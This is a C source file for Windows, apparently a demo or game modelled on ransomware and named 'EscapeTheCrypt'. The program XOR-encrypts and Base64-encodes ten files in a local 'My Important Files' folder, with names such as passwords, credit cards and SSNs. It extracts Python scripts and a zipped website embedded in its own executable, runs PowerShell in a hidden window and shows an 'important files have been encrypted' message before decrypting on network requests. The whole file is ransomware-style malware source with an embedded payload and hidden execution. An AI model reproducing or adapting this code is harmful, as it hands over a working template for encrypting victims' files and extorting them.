#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>

#include <Windows.h>

#include "networkLayer.h"

#define FILES_DIR            ".\\My Important Files\\"
#define ZIP_OFFSET           0x416BE
#define ENCODE_SCRIPT_OFFSET 0x1F4421
#define DECODE_SCRIPT_OFFSET 0x1F497D
#define DECODE_SCRIPT_LENGTH 0x48D

typedef struct {
    const char* fullPath;
    int dataLen;
} EncryptedFile;

// For debugging
// void copyFile(const char* dstFileFullPath, const char* srcFileFullPath) {
//     FILE* dstFile = fopen(dstFileFullPath, "wb+");
//     FILE* srcFile = fopen(srcFileFullPath, "rb");

//     fseek(srcFile, 0, SEEK_END);
//     int srcFileSize = ftell(srcFile);
//     rewind(srcFile);

//     uint8_t* srcFileData = (uint8_t*)malloc((sizeof(uint8_t) * srcFileSize + 1));
//     fread(srcFileData, sizeof(uint8_t), srcFileSize, srcFile);
//     // srcFileData[srcFileSize - 1] = '\0';

//     fseek(dstFile, 0, SEEK_SET);
//     fwrite(srcFileData, srcFileSize, 1, dstFile);

//     fclose(dstFile);
//     fclose(srcFile);
//     free(srcFileData);
// }

EncryptedFile encryptFile(const char key, const char* fullPath) {
    EncryptedFile fileInfo = {.fullPath = fullPath};
    // Base64 encode file
    char pyCall[300];
    char scriptPath[MAX_PATH];
    GetTempPath(MAX_PATH, scriptPath);
    sprintf(pyCall, "python \"%sencode.py\" \"%s\" 0", scriptPath, fullPath);
    printf("%s\n", pyCall);
    system(pyCall);

    // Open file
    FILE* filetoEncrypt = fopen(fullPath, "rb+");
    if (filetoEncrypt == NULL) {
        printf("Failed to open file \"%s\" for encryption\n", fullPath);
        fileInfo.dataLen = 0;
        return fileInfo;
    }
    fseek(filetoEncrypt, 0, SEEK_END);

    int fileSize = ftell(filetoEncrypt);
    /* Store the data length so that
    we know where to null-terminate
    the string after decryption */
    fileInfo.dataLen = fileSize;

    rewind(filetoEncrypt);

    // Read file into array
    char* fileData = (char*)malloc(sizeof(char) * fileSize);
    fread(fileData, sizeof(char), fileSize, filetoEncrypt);
    rewind(filetoEncrypt);

    // XOR encryption
    for (int i = 0; i < fileSize; i++) {
        // printf("%c", fileData[i]);
        fileData[i] ^= key;
    }
    printf("\n");

    // Write encrypted data to file
    fwrite(fileData, fileSize, 1, filetoEncrypt);

    fclose(filetoEncrypt);
    free(fileData);

    printf("Encrypted %s\n", fullPath);
    return fileInfo;
}

void decryptFile(int key, EncryptedFile* fileInfo) {
    // Open file
    FILE* filetoDecrypt = fopen(fileInfo->fullPath, "rb+");
    if (filetoDecrypt == NULL) {
        printf("Failed to open file \"%s\" for decryption\n", fileInfo->fullPath);
        return;
    }

    // Read file into array
    char* fileData = (char*)malloc(sizeof(char) * fileInfo->dataLen);
    fread(fileData, sizeof(char), fileInfo->dataLen, filetoDecrypt);
    rewind(filetoDecrypt);

    // Undo XOR encryption
    for (int i = 0; i < fileInfo->dataLen; i++) {
        fileData[i] ^= key;
    }

    // Write decrypted data to file
    fwrite(fileData, fileInfo->dataLen, 1, filetoDecrypt);

    fclose(filetoDecrypt);
    free(fileData);

    // Base64 decode file
    char pyCall[300];
    char scriptPath[MAX_PATH];
    GetTempPath(MAX_PATH, scriptPath);
    sprintf(pyCall, "python \"%sdecode.py\" \"%s\" 0", scriptPath, fileInfo->fullPath);
    printf("%s\n", pyCall);
    system(pyCall);

    printf("Decrypted %s\n", fileInfo->fullPath);
}

void extractZip(const char* thisFilename) {
    // Place file in Temp
    char zipPath[MAX_PATH];
    GetTempPath(MAX_PATH, zipPath);
    strcat_s(zipPath, MAX_PATH, "site.zip");

    FILE* thisFile = fopen(thisFilename, "rb");
    FILE* outZip = fopen(zipPath, "wb+");
    char buf[ENCODE_SCRIPT_OFFSET - ZIP_OFFSET];

    // Copy zip data to zip file
    fseek(thisFile, ZIP_OFFSET, SEEK_SET);
    fread(buf, ENCODE_SCRIPT_OFFSET - ZIP_OFFSET, 1, thisFile);
    fwrite(buf, ENCODE_SCRIPT_OFFSET - ZIP_OFFSET, 1, outZip);

    fclose(thisFile);
    fclose(outZip);
}

void extractPyScripts(const char* thisFilename) {
    // Place files in Temp
    char encodeScriptPath[MAX_PATH], decodeScriptPath[MAX_PATH];
    GetTempPath(MAX_PATH, encodeScriptPath);
    GetTempPath(MAX_PATH, decodeScriptPath);
    strcat_s(encodeScriptPath, MAX_PATH, "encode.py");
    strcat_s(decodeScriptPath, MAX_PATH, "decode.py");

    FILE* thisFile = fopen(thisFilename, "rb");
    FILE* encodeScript = fopen(encodeScriptPath, "wb+");
    if (encodeScript == NULL) {
        printf("encode script null!\n");
        return;
    }
    FILE* decodeScript = fopen(decodeScriptPath, "wb+");
    if (encodeScript == NULL) {
        printf("decode script null!\n");
        return;
    }
    char encodeScriptBuf[DECODE_SCRIPT_OFFSET - ENCODE_SCRIPT_OFFSET], decodeScriptBuf[DECODE_SCRIPT_LENGTH];

    // Copy data to files
    fseek(thisFile, ENCODE_SCRIPT_OFFSET, SEEK_SET);
    fread(encodeScriptBuf, DECODE_SCRIPT_OFFSET - ENCODE_SCRIPT_OFFSET, 1, thisFile);
    fwrite(encodeScriptBuf, DECODE_SCRIPT_OFFSET - ENCODE_SCRIPT_OFFSET, 1, encodeScript);

    fseek(thisFile, DECODE_SCRIPT_OFFSET, SEEK_SET);
    fread(decodeScriptBuf, DECODE_SCRIPT_LENGTH, 1, thisFile);
    fwrite(decodeScriptBuf, DECODE_SCRIPT_LENGTH, 1, decodeScript);

    fclose(thisFile);
    fclose(encodeScript);
    fclose(decodeScript);
}

void openGameShow() {
    // Unzip the extracted archive
    printf("Unzipping site.zip...");
    system("powershell -WindowStyle hidden -command \"Expand-Archive -Path %Temp%\\site.zip -DestinationPath %Temp%\\site");
    printf("done\n");
    // Open the site
    printf("Opening site...");

    // Open a message box
    int msgboxID = MessageBox(
        NULL,
        (LPCTSTR)"Your important files have been encrypted!\nLet's play a game to get them back...",
        (LPCTSTR)"EscapeTheCrypt",
        MB_OK
    );
    switch (msgboxID) {
        case IDOK:
            break;
    }

    system("%Temp%\\site\\index.html");
    printf("done\n");
}

int main(int argc, char* argv[]) {
    const char* thisFilename = argv[0];
    const char key = '%';

    // Just for debugging
    // copyFile(FILES_DIR"Addresses.txt",
    //     FILES_DIR"Addresses - copia.txt");
    // copyFile(FILES_DIR"Credit Card Information.txt",
    //     FILES_DIR"Credit Card Information - copia.txt");
    // copyFile(FILES_DIR"My Mothers Maiden Name.txt",
    //     FILES_DIR"My Mothers Maiden Name - copia.txt");
    // copyFile(FILES_DIR"Passwords.txt",
    //     FILES_DIR"Passwords - copia.txt");
    // copyFile(FILES_DIR"RSA Private Key.txt",
    //     FILES_DIR"RSA Private Key - copia.txt");
    // copyFile(FILES_DIR"My Childhood Photo.png",
    //     FILES_DIR"My Childhood Photo - copia.png");
    // copyFile(FILES_DIR"My SSNs.txt",
    //     FILES_DIR"My SSNs - copia.txt");
    // copyFile(FILES_DIR"My Super Secret Communications.txt",
    //     FILES_DIR"My Super Secret Communications - copia.txt");
    // copyFile(FILES_DIR"SSL Certs.txt",
    //     FILES_DIR"SSL Certs - copia.txt");
    // copyFile(FILES_DIR"Coordinates.txt",
    //     FILES_DIR"Coordinates - copia.txt");

    char* files[] = {
        FILES_DIR"Addresses.txt",
        FILES_DIR"Credit Card Information.txt",
        FILES_DIR"My Mothers Maiden Name.txt",
        FILES_DIR"Passwords.txt",
        FILES_DIR"RSA Private Key.txt",
        FILES_DIR"My Childhood Photo.png",
        FILES_DIR"My SSNs.txt",
        FILES_DIR"My Super Secret Communications.txt",
        FILES_DIR"SSL Certs.txt",
        FILES_DIR"Coordinates.txt"
    };
    int numFiles = sizeof(files)/sizeof(files[0]);

    extractPyScripts(thisFilename);
    printf("Extracted Python scripts\n");

    EncryptedFile encryptedFiles[numFiles];
    // Encrypt files
    for (int i = 0; i < numFiles; i++)
        encryptedFiles[i] = encryptFile(key, files[i]);

    /* Extract zip file containing website from exe
    and open it in user's browser */
    extractZip(thisFilename);
    openGameShow();

    // Decrypt files as requests come in
    for (int i = 0; i < numFiles; i++) {
        if (requestListener() == 0)
            decryptFile(key, &encryptedFiles[i]);
    }

    return 0;
}